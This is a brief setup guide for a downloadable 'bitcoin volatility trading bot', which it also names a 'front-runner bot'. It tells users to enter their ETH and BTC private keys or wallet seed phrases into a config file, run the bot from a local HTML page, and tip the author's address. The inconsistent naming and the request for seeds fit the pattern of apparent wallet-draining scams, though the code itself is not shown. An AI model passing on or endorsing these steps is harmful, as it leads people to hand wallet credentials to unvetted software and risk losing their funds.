bitcoin volatility trading bot, feel free to fork and improve or whatever. 
you should be able to modify it to work on various exchanges default its using the thorchain for all swaps
if you fork and modify please give credit
This is a tutorial to help run the front-runner bot (javascript version).

Let’s get started.

Part 1. Main software installations.

Extract the Bitcoin-volatility-trading-bot anywhere you like.

Part 2. Editing the settings.

Open the bot folder find "config.js" file and open it with a text-editor:

1.Set your ETH wallet address and private key or your wallet seed if you have a wallet that does not give you the private key
// note you will need some eth in the wallet for gas to push the stablecoin to thorswap

2.Set your BTC wallet address and private key or your wallet seed if you have a wallet that does not give you the private key

3.Set the max amount of BTC you want to uses it will only traded that amount no matter what in the wallet you provided

4.save changes to "config.js"

5.open "index.html" with any webbrowser 
Happy Stacking :)

When you make some money and if you fill like thanking me my eth/bnb/polygon address is 0x2431bec69aa4699ad9A9aE77233F7bdcD6d631f8
